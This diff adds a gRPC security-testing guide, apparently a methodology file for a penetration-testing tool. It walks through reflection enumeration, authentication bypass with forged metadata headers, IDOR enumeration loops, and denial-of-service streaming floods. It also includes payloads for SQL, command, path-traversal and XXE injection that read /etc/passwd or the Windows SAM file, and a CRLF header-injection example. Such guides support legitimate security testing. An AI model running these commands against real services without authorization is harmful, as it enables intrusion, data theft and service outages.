@@ -1,0 +1,811 @@
+<grpc_testing_guide>
+<title>gRPC SECURITY TESTING</title>
+
+<critical>gRPC services using Protocol Buffers require specialized testing approaches. Focus on reflection API enumeration, authentication bypass, message manipulation, streaming vulnerabilities, and HTTP/2 protocol-level attacks.</critical>
+
+<scope>
+- gRPC reflection API enumeration and abuse
+- Protobuf message manipulation and fuzzing
+- Authentication and authorization bypass
+- Stream hijacking and manipulation
+- Error-based information disclosure
+- HTTP/2 protocol attacks (HPACK bombing, flow control)
+- gRPC-Web bridge vulnerabilities
+- Metadata (header) injection
+</scope>
+
+<methodology>
+1. Discover gRPC services via reflection API or proto file analysis
+2. Enumerate methods and message structures
+3. Test authentication mechanisms for bypass
+4. Probe authorization on each method individually
+5. Fuzz message fields for injection and validation flaws
+6. Test streaming endpoints for resource exhaustion
+7. Analyze error messages for information disclosure
+</methodology>
+
+<service_discovery>
+<reflection_enumeration>
+{% raw %}
+# gRPC Server Reflection Protocol
+# RFC: https://github.com/grpc/grpc/blob/master/doc/server-reflection.md
+
+# Check if reflection is enabled
+grpcurl -plaintext localhost:50051 list
+
+# List all services
+grpcurl -plaintext target.com:443 list
+# Output:
+# grpc.reflection.v1alpha.ServerReflection
+# mypackage.UserService
+# mypackage.AdminService
+# mypackage.PaymentService
+
+# Describe a service (get all methods)
+grpcurl -plaintext target.com:443 describe mypackage.UserService
+# Output:
+# service UserService {
+#   rpc GetUser ( .mypackage.GetUserRequest ) returns ( .mypackage.User );
+#   rpc UpdateUser ( .mypackage.UpdateUserRequest ) returns ( .mypackage.User );
+#   rpc DeleteUser ( .mypackage.DeleteUserRequest ) returns ( .google.protobuf.Empty );
+#   rpc ListUsers ( .mypackage.ListUsersRequest ) returns ( stream .mypackage.User );
+# }
+
+# Describe a message type
+grpcurl -plaintext target.com:443 describe mypackage.User
+# Output:
+# message User {
+#   string user_id = 1;
+#   string email = 2;
+#   string role = 3;
+#   int64 created_at = 4;
+#   bool is_active = 5;
+# }
+
+# Describe a method specifically
+grpcurl -plaintext target.com:443 describe mypackage.UserService.GetUser
+# Shows request and response types
+{% endraw %}
+</reflection_enumeration>
+
+<proto_analysis>
+{% raw %}
+# If proto files are available (source code, mobile app decompilation)
+
+# Extract from Android APK
+unzip app.apk
+find . -name "*.proto"
+find . -name "*descriptor*"
+
+# Extract from iOS IPA  
+unzip app.ipa
+find . -name "*.proto"
+
+# Decompile proto descriptors
+protoc --decode_raw < descriptor.bin
+
+# Generate client stubs from proto
+protoc --python_out=. --grpc_python_out=. service.proto
+protoc --go_out=. --go-grpc_out=. service.proto
+{% endraw %}
+</proto_analysis>
+
+<endpoint_identification>
+{% raw %}
+# gRPC characteristics
+
+# HTTP/2 indicators:
+# - Content-Type: application/grpc
+# - POST method only
+# - Path: /{package}.{service}/{method}
+
+# Example request:
+POST /mypackage.UserService/GetUser HTTP/2
+Host: api.example.com
+Content-Type: application/grpc
+TE: trailers
+User-Agent: grpc-go/1.40.0
+
+# Common ports:
+# - 443 (HTTPS)
+# - 50051 (common default)
+# - 8080 (insecure)
+# - 9090 (metrics/admin)
+
+# Network traffic patterns:
+# - HTTP/2 SETTINGS frame
+# - Binary Protocol Buffer data
+# - Trailers with grpc-status
+{% endraw %}
+</endpoint_identification>
+
+<hidden_services>
+{% raw %}
+# Look for internal/admin services
+
+# Common naming patterns:
+# - InternalService
+# - AdminService  
+# - DebugService
+# - HealthService
+# - MetricsService
+
+# Health check endpoint (standard)
+grpcurl -plaintext target.com:443 grpc.health.v1.Health/Check
+
+# Metrics/observability
+grpcurl -plaintext target.com:443 grpc.observability.v1.Metrics/Get
+{% endraw %}
+</hidden_services>
+</service_discovery>
+
+<authentication_testing>
+<no_authentication>
+{% raw %}
+# Test methods without any credentials
+
+# Attempt direct access
+grpcurl -plaintext -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+
+# If successful, authentication is missing
+# Test each method individually as coverage may be inconsistent
+
+# Script to test all methods
+for method in $(grpcurl -plaintext target.com:443 list mypackage.UserService | grep rpc | awk '{print $2}'); do
+  echo "Testing: $method"
+  grpcurl -plaintext -d '{}' target.com:443 "mypackage.UserService/$method"
+done
+{% endraw %}
+</no_authentication>
+
+<token_authentication>
+{% raw %}
+# gRPC uses metadata (HTTP/2 headers) for auth
+
+# Standard authorization header
+grpcurl -plaintext \
+  -H "Authorization: Bearer eyJhbGc..." \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+
+# Custom token headers
+grpcurl -plaintext \
+  -H "x-api-key: abc123" \
+  -H "x-auth-token: xyz789" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+
+# Test without token
+grpcurl -plaintext -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+# Expected: Unauthenticated error
+# Actual (vulnerable): Returns data
+
+# Test with invalid token
+grpcurl -plaintext \
+  -H "Authorization: Bearer invalid_token" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+
+# Test with expired token
+grpcurl -plaintext \
+  -H "Authorization: Bearer <expired_jwt>" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+
+# Token from different service/scope
+grpcurl -plaintext \
+  -H "Authorization: Bearer <other_service_token>" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+{% endraw %}
+</token_authentication>
+
+<mtls_testing>
+{% raw %}
+# Mutual TLS authentication
+
+# Test without client certificate
+grpcurl -insecure target.com:443 mypackage.UserService/GetUser
+# Expected: TLS handshake failure
+# Actual (vulnerable): Connection succeeds
+
+# Test with self-signed certificate
+grpcurl -cert self_signed.crt -key self_signed.key \
+  target.com:443 mypackage.UserService/GetUser
+
+# Test with valid cert for different CN/SAN
+grpcurl -cert other_service.crt -key other_service.key \
+  target.com:443 mypackage.UserService/GetUser
+
+# Certificate validation bypass
+# Check if server validates:
+# - Certificate chain (CA)
+# - Certificate revocation (CRL/OCSP)
+# - Common Name (CN)
+# - Subject Alternative Names (SAN)
+# - Certificate expiration
+{% endraw %}
+</mtls_testing>
+
+<authentication_bypass>
+{% raw %}
+# Common bypass techniques
+
+# Metadata injection to forge identity
+grpcurl -plaintext \
+  -H "x-user-id: admin" \
+  -H "x-role: administrator" \
+  -H "x-authenticated: true" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+
+# Forwarded headers
+grpcurl -plaintext \
+  -H "x-forwarded-user: admin" \
+  -H "x-forwarded-role: admin" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+
+# Internal service header
+grpcurl -plaintext \
+  -H "x-internal-call: true" \
+  -H "x-service-name: internal-service" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+
+# Proxy headers (if behind proxy)
+grpcurl -plaintext \
+  -H "x-real-ip: 127.0.0.1" \
+  -H "x-forwarded-for: 127.0.0.1" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+{% endraw %}
+</authentication_bypass>
+</authentication_testing>
+
+<authorization_testing>
+<idor_horizontal>
+{% raw %}
+# Broken Object Level Authorization (BOLA/IDOR)
+
+# Authenticated as user_123
+grpcurl -plaintext \
+  -H "Authorization: Bearer user_123_token" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+# Expected: Success (own data)
+
+# Try to access user_456's data
+grpcurl -plaintext \
+  -H "Authorization: Bearer user_123_token" \
+  -d '{"user_id": "456"}' \
+  target.com:443 mypackage.UserService/GetUser
+# Expected: Forbidden
+# Actual (vulnerable): Returns user_456's data
+
+# Enumeration
+for i in {1..100}; do
+  grpcurl -plaintext \
+    -H "Authorization: Bearer $TOKEN" \
+    -d "{\"user_id\": \"$i\"}" \
+    target.com:443 mypackage.UserService/GetUser >> results.txt
+done
+
+# UUID enumeration
+grpcurl -plaintext \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"user_id": "00000000-0000-0000-0000-000000000001"}' \
+  target.com:443 mypackage.UserService/GetUser
+{% endraw %}
+</idor_horizontal>
+
+<privilege_escalation>
+{% raw %}
+# Broken Function Level Authorization (BFLA)
+
+# Regular user tries admin method
+grpcurl -plaintext \
+  -H "Authorization: Bearer regular_user_token" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.AdminService/DeleteUser
+# Expected: Forbidden
+# Actual (vulnerable): User deleted
+
+# Hidden/undocumented admin methods
+grpcurl -plaintext \
+  -H "Authorization: Bearer regular_user_token" \
+  list mypackage.AdminService
+
+grpcurl -plaintext \
+  -H "Authorization: Bearer regular_user_token" \
+  -d '{}' \
+  target.com:443 mypackage.AdminService/ListAllUsers
+
+# Internal methods exposed
+grpcurl -plaintext list mypackage.InternalService
+grpcurl -plaintext -d '{}' target.com:443 mypackage.InternalService/DebugInfo
+{% endraw %}
+</privilege_escalation>
+
+<mass_assignment>
+{% raw %}
+# Inject privileged fields in message
+
+# Update user profile
+grpcurl -plaintext \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{
+    "user_id": "123",
+    "email": "new@example.com",
+    "role": "admin",
+    "is_verified": true,
+    "permissions": ["read", "write", "admin"]
+  }' \
+  target.com:443 mypackage.UserService/UpdateUser
+
+# Even if fields are not in proto definition
+# Protobuf3 ignores unknown fields by default
+# But server logic may process them
+
+# Test numeric field IDs directly (if proto known)
+# Field numbers may reveal hidden fields
+{% endraw %}
+</mass_assignment>
+</authorization_testing>
+
+<message_manipulation>
+<field_fuzzing>
+{% raw %}
+# Type confusion
+grpcurl -plaintext -d '{"user_id": "123"}' target.com:443 mypackage.UserService/GetUser
+grpcurl -plaintext -d '{"user_id": 123}' target.com:443 mypackage.UserService/GetUser
+
+# Boundary values
+grpcurl -plaintext -d '{"count": -1}' target.com:443 mypackage.UserService/ListUsers
+grpcurl -plaintext -d '{"count": 0}' target.com:443 mypackage.UserService/ListUsers
+grpcurl -plaintext -d '{"count": 999999999}' target.com:443 mypackage.UserService/ListUsers
+grpcurl -plaintext -d '{"count": 2147483647}' target.com:443 mypackage.UserService/ListUsers
+
+# Negative amounts
+grpcurl -plaintext -d '{"amount": -1000}' target.com:443 mypackage.PaymentService/Transfer
+
+# Empty/null values
+grpcurl -plaintext -d '{}' target.com:443 mypackage.UserService/UpdateUser
+grpcurl -plaintext -d '{"user_id": ""}' target.com:443 mypackage.UserService/GetUser
+grpcurl -plaintext -d '{"user_id": null}' target.com:443 mypackage.UserService/GetUser
+
+# Large strings
+grpcurl -plaintext -d "{\"name\": \"$('A' * 10000)\"}" target.com:443 mypackage.UserService/CreateUser
+
+# Unicode and special characters  
+grpcurl -plaintext -d '{"name": "test\u0000user"}' target.com:443 mypackage.UserService/CreateUser
+grpcurl -plaintext -d '{"name": "test\nuser\r\n"}' target.com:443 mypackage.UserService/CreateUser
+{% endraw %}
+</field_fuzzing>
+
+<injection_attacks>
+{% raw %}
+# SQL Injection
+grpcurl -plaintext -d '{"query": "test\" OR 1=1--"}' \
+  target.com:443 mypackage.SearchService/Search
+
+grpcurl -plaintext -d '{"email": "admin@example.com\" OR \"1\"=\"1"}' \
+  target.com:443 mypackage.UserService/GetUserByEmail
+
+# NoSQL Injection
+grpcurl -plaintext -d '{"query": "{\"$gt\": \"\"}"}' \
+  target.com:443 mypackage.SearchService/Search
+
+# Command Injection
+grpcurl -plaintext -d '{"filename": "test.txt; cat /etc/passwd"}' \
+  target.com:443 mypackage.FileService/ProcessFile
+
+grpcurl -plaintext -d '{"command": "status; id"}' \
+  target.com:443 mypackage.SystemService/Execute
+
+# Path Traversal
+grpcurl -plaintext -d '{"path": "../../../etc/passwd"}' \
+  target.com:443 mypackage.FileService/ReadFile
+
+grpcurl -plaintext -d '{"filename": "..\\..\\..\\windows\\system32\\config\\sam"}' \
+  target.com:443 mypackage.FileService/ReadFile
+
+# LDAP Injection
+grpcurl -plaintext -d '{"username": "admin)(uid=*))(|(uid=*"}' \
+  target.com:443 mypackage.AuthService/Login
+
+# XSS (if data rendered in web UI)
+grpcurl -plaintext -d '{"name": "<script>alert(1)</script>"}' \
+  target.com:443 mypackage.UserService/CreateUser
+
+grpcurl -plaintext -d '{"comment": "<img src=x onerror=alert(1)>"}' \
+  target.com:443 mypackage.CommentService/AddComment
+
+# Template Injection
+grpcurl -plaintext -d '{"template": "{{7*7}}"}' \
+  target.com:443 mypackage.TemplateService/Render
+
+# XXE (if XML processing involved)
+grpcurl -plaintext -d '{"xml_data": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"}' \
+  target.com:443 mypackage.XmlService/Process
+{% endraw %}
+</injection_attacks>
+
+<oneof_manipulation>
+{% raw %}
+# Protobuf oneof fields allow only one variant
+
+# Example proto:
+# message Request {
+#   oneof request_type {
+#     UserRequest user = 1;
+#     AdminRequest admin = 2;
+#   }
+# }
+
+# Try setting privileged variant
+grpcurl -plaintext -d '{"admin": {"action": "delete_all"}}' \
+  target.com:443 mypackage.Service/Process
+
+# Try setting multiple (should be rejected but test)
+grpcurl -plaintext -d '{"user": {...}, "admin": {...}}' \
+  target.com:443 mypackage.Service/Process
+{% endraw %}
+</oneof_manipulation>
+
+<repeated_fields>
+{% raw %}
+# Repeated fields (arrays)
+
+# Empty array
+grpcurl -plaintext -d '{"items": []}' target.com:443 mypackage.Service/Process
+
+# Large array (DoS potential)
+grpcurl -plaintext -d '{"items": [1,2,3,...1000000]}' target.com:443 mypackage.Service/Process
+
+# Duplicate values
+grpcurl -plaintext -d '{"ids": ["123", "123", "123"]}' target.com:443 mypackage.Service/Process
+
+# Mixed types (if validation weak)
+grpcurl -plaintext -d '{"items": [1, "string", true, null]}' target.com:443 mypackage.Service/Process
+{% endraw %}
+</repeated_fields>
+</message_manipulation>
+
+<metadata_attacks>
+<header_injection>
+{% raw %}
+# gRPC metadata = HTTP/2 headers
+
+# Custom headers to forge identity/permissions
+grpcurl -plaintext \
+  -H "x-user-id: admin" \
+  -H "x-role: administrator" \
+  -H "x-tenant-id: all" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+
+# Internal service indicators
+grpcurl -plaintext \
+  -H "x-internal-call: true" \
+  -H "x-service-to-service: true" \
+  -H "x-bypass-auth: true" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+
+# IP spoofing headers
+grpcurl -plaintext \
+  -H "x-forwarded-for: 127.0.0.1" \
+  -H "x-real-ip: 127.0.0.1" \
+  -H "x-originating-ip: 127.0.0.1" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+
+# Custom auth headers (API gateways)
+grpcurl -plaintext \
+  -H "x-api-key: test" \
+  -H "x-client-id: trusted-client" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+
+# Metadata injection via CRLF
+# (if application processes headers unsafely)
+grpcurl -plaintext \
+  -H "user-agent: test%0d%0ax-admin: true" \
+  -d '{"user_id": "123"}' \
+  target.com:443 mypackage.UserService/GetUser
+{% endraw %}
+</header_injection>
+
+<deadline_manipulation>
+{% raw %}
+# gRPC deadline (timeout) control
+
+# Very long deadline (resource exhaustion)
+grpcurl -plaintext \
+  -connect-timeout 3600 \
+  -max-time 3600 \
+  -d '{}' \
+  target.com:443 mypackage.Service/LongRunningOperation
+
+# Very short deadline (partial operations)
+# May cause incomplete transactions
+grpcurl -plaintext \
+  -connect-timeout 0.001 \
+  -max-time 0.001 \
+  -d '{"amount": 1000}' \
+  target.com:443 mypackage.PaymentService/Transfer
+
+# Check if deadline propagates to downstream services
+# Improper propagation may cause cascading failures
+{% endraw %}
+</deadline_manipulation>
+</metadata_attacks>
+
+<streaming_attacks>
+<client_streaming>
+{% raw %}
+# Client sends stream of messages
+
+# Massive stream (resource exhaustion)
+for i in {1..1000000}; do
+  echo "{\"data\": \"chunk_$i\"}"
+done | grpcurl -plaintext -d @ target.com:443 mypackage.Service/Upload
+
+# Never-ending stream
+mkfifo stream_pipe
+cat stream_pipe | grpcurl -plaintext -d @ target.com:443 mypackage.Service/Upload &
+# Stream continues indefinitely
+
+# Stream with malformed messages
+echo '{"data": "valid"}' > stream.txt
+echo '{invalid json}' >> stream.txt
+echo '{"data": "valid"}' >> stream.txt
+cat stream.txt | grpcurl -plaintext -d @ target.com:443 mypackage.Service/Upload
+
+# Abrupt disconnect (resource leak?)
+timeout 1 grpcurl -plaintext -d @ target.com:443 mypackage.Service/Upload <<EOF
+{"data": "test"}
+EOF
+# Check if server cleans up resources
+{% endraw %}
+</client_streaming>
+
+<server_streaming>
+{% raw %}
+# Server sends stream of messages
+
+# Request huge stream (DoS)
+grpcurl -plaintext -d '{"limit": 999999999}' \
+  target.com:443 mypackage.Service/StreamAll
+
+# Request stream without limit
+grpcurl -plaintext -d '{}' \
+  target.com:443 mypackage.Service/Subscribe
+# Does it ever end?
+
+# Filter bypass
+grpcurl -plaintext -d '{"filter": ""}' \
+  target.com:443 mypackage.Service/ListUsers
+# Empty filter may bypass access controls
+
+# Cancel stream mid-way
+timeout 5 grpcurl -plaintext -d '{}' target.com:443 mypackage.Service/StreamAll
+# Check server resource cleanup
+{% endraw %}
+</server_streaming>
+
+<bidirectional_streaming>
+{% raw %}
+# Both client and server stream
+
+# Most complex attack surface
+# Test for:
+# - Race conditions in message handling
+# - Out-of-order message processing
+# - Stream hijacking (if connection reused)
+# - Message correlation issues
+
+# Example test
+grpcurl -plaintext -d @ target.com:443 mypackage.ChatService/Chat <<EOF
+{"message": "hello"}
+{"message": "world"}
+{"message": "test"}
+EOF
+
+# Rapid message sending
+for i in {1..1000}; do
+  echo "{\"message\": \"msg_$i\"}"
+done | grpcurl -plaintext -d @ target.com:443 mypackage.ChatService/Chat
+
+# Mixed message types
+grpcurl -plaintext -d @ target.com:443 mypackage.Service/Process <<EOF
+{"type": "command", "data": "start"}
+{"type": "data", "data": "content"}
+{"type": "command", "data": "stop"}
+{"type": "data", "data": "more content"}
+{"type": "command", "data": "stop"}
+EOF
+{% endraw %}
+</bidirectional_streaming>
+</streaming_attacks>
+
+<http2_protocol_attacks>
+<hpack_bombing>
+{% raw %}
+# HPACK header compression attack
+# Send many headers to exhaust dynamic table
+
+# Large number of unique headers
+for i in {1..10000}; do
+  echo "-H \"x-custom-header-$i: value$i\""
+done
+
+# Each unique header adds to HPACK dynamic table
+# Can cause memory exhaustion
+{% endraw %}
+</hpack_bombing>
+
+<stream_multiplexing_abuse>
+{% raw %}
+# HTTP/2 allows many concurrent streams
+
+# Open many streams simultaneously
+for i in {1..1000}; do
+  grpcurl -plaintext -d '{"id": "'$i'"}' \
+    target.com:443 mypackage.Service/Get &
+done
+
+# May exhaust server resources
+# Check MAX_CONCURRENT_STREAMS setting
+{% endraw %}
+</stream_multiplexing_abuse>
+
+<flow_control_attacks>
+{% raw %}
+# HTTP/2 flow control manipulation
+
+# Send WINDOW_UPDATE frames to control flow
+# Requires low-level HTTP/2 client
+
+# Reduce window size to slow server
+# Or increase to request large data
+{% endraw %}
+</flow_control_attacks>
+
+<ping_flood>
+{% raw %}
+# PING frame flood
+
+# Send excessive PING frames
+# Server must respond to each
+# Can cause DoS
+
+# Requires custom HTTP/2 client
+{% endraw %}
+</ping_flood>
+</http2_protocol_attacks>
+
+<grpc_web_testing>
+<concept>
+{% raw %}
+# gRPC-Web allows browser access to gRPC
+# Uses HTTP/1.1 with special encoding
+# Often deployed alongside native gRPC
+
+# Different authentication from native gRPC
+# May have different security controls
+{% endraw %}
+</concept>
+
+<testing_approach>
+{% raw %}
+# Identify gRPC-Web endpoint
+# Content-Type: application/grpc-web-text or application/grpc-web+proto
+
+# Test via HTTP/1.1
+curl -X POST \
+  -H "Content-Type: application/grpc-web-text" \
+  -H "X-Grpc-Web: 1" \
+  -d "base64_encoded_message" \
+  https://target.com/mypackage.UserService/GetUser
+
+# Check if authentication differs
+curl -X POST \
+  -H "Content-Type: application/grpc-web-text" \
+  -H "X-Grpc-Web: 1" \
+  -d "..." \
+  https://target.com/mypackage.UserService/GetUser
+# vs
+grpcurl -H "Authorization: Bearer token" \
+  target.com:443 mypackage.UserService/GetUser
+
+# Test both native gRPC and gRPC-Web
+# Different code paths may have different vulnerabilities
+{% endraw %}
+</testing_approach>
+</grpc_web_testing>
+
+<error_analysis>
+<information_disclosure>
+{% raw %}
+# gRPC error messages can leak information
+
+# Stack traces
+grpcurl -plaintext -d '{"id": "invalid"}' \
+  target.com:443 mypackage.Service/Get
+# Look for file paths, function names, SQL queries
+
+# Internal IP addresses
+# Error: "Failed to connect to database at 10.0.1.50:5432"
+
+# Technology stack information
+# Error: "PostgreSQL error: ..."
+# Error: "Redis connection failed..."
+
+# Sensitive data in error details
+# Error: "User test@example.com not found"
+# Confirms email existence
+
+# SQL query exposure
+# Error: "SQL error: SELECT * FROM users WHERE id = 'abc'"
+# Reveals table structure
+
+# gRPC status details
+# May contain sensitive information in metadata
+{% endraw %}
+</information_disclosure>
+</error_analysis>
+
+<validation>
+1. Demonstrate unauthorized method access via reflection
+2. Prove authentication bypass with reproducible request
+3. Show IDOR by accessing other users' data
+4. Document message manipulation leading to privilege escalation
+5. Provide grpcurl commands that reproduce the vulnerability
+6. Show error messages revealing sensitive information
+7. Demonstrate impact (data access, privilege escalation, DoS)
+</validation>
+
+<false_positives>
+- Reflection API disabled in production
+- Proper authentication on all methods
+- Authorization enforced at method and message field level
+- Input validation preventing injection
+- Rate limiting on all endpoints
+- Proper error handling without information disclosure
+- Stream resource limits enforced
+</false_positives>
+
+<impact>
+- Service enumeration via reflection
+- Authentication bypass
+- Authorization bypass (IDOR, privilege escalation)
+- Data manipulation and injection attacks
+- Denial of service via streaming abuse
+- Information disclosure
+- Remote code execution via injection
+</impact>
+
+<pro_tips>
+1. Always check reflection API first—it's a complete service roadmap
+2. Use grpcui for interactive testing (generates UI from reflection)
+3. Test each method individually—coverage is often inconsistent
+4. Protobuf doesn't enforce business logic constraints—fuzz boundaries
+5. Check both native gRPC and gRPC-Web if available
+6. Metadata (headers) are critical attack surface
+7. Error messages often leak internal details
+8. Streaming endpoints are high-value DoS targets
+9. Look for admin/internal services alongside public ones
+10. HTTP/2 tools (h2load, h2spec) useful for protocol testing
+11. Binary nature creates false security through obscurity
+12. Test with malformed protobuf to check parser robustness
+13. Check if idempotency keys protect state-changing methods
+14. Stream cancellation should clean up resources properly
+15. gRPC interceptors may have inconsistent auth logic
+</pro_tips>
+
+<remember>gRPC's binary format and lack of browser dev tools create security blind spots. Reflection API often exposes the entire service definition. Test authentication on every method—coverage is typically inconsistent. Message validation is often weak because protobuf only enforces types, not business logic. Streaming endpoints are particularly vulnerable to resource exhaustion. Always test both gRPC and gRPC-Web paths as they may have different security controls.</remember>
+</grpc_testing_guide>
